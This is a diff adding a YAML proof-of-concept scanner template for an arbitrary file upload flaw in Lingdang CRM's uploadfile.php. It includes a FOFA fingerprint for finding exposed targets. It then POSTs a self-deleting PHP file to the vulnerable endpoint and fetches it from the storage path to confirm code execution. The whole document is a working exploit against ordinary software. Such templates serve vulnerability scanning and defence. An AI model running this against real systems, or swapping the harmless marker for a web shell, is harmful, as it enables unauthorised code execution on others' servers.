@@ -1,0 +1,32 @@
+id: poc-yaml-51mis-crm-uploadfile-php-anyfile-upload
+info:
+  name: 灵当CRM uploadfile.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="include/js/ldAjax.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt: datetime("2006")
+requests:
+- method: POST
+  path: /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: file_info={"name":"{{.t1}}.php"}&<?php echo md5({{.t1}});unlink(__FILE__);?>
+  expression: 'status_code == 200 &&
+
+    contains(body,"filepath") &&
+
+    contains(body,".php")
+
+    '
+  output:
+  - regex_match(body,"\"filename\":\"(?P<file>.*?).php")
+- method: GET
+  path: /crm/storage/{{.dt}}/December/week4/{{.file}}.php
+  expression: status_code == 200 && contains(body,"file_info") && contains(body,t1)
+    && contains(body,t2) && !contains(body,"<")
+transport: http
